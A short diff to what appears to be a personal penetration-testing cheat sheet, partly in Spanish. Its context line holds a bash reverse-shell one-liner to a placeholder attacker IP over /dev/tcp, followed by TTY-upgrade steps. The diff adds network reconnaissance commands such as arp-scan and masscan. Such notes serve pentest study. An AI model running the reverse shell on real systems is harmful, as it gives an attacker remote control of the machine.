@@ -227,3 +227,13 @@ system("bash -c 'bash -i >& /dev/tcp/IP_YOUR_LOCAL_MACHINE/443 0>&1'")
 CTRL + Z
 `stty raw -echo; fg`
 `reset xterm`
+
+
+# Useful commands:
+
+`route -n`
+`pwdx processId`: See the route of the processId
+`hostname -I`
+`arp-scan -I ens33 --localnet`
+`timeout 1 OTHER_COMMAND`: this command takes 1 second to execute at most
+`masscan`: escano de puertos y herramienta profesional muy potente para auditar empresas
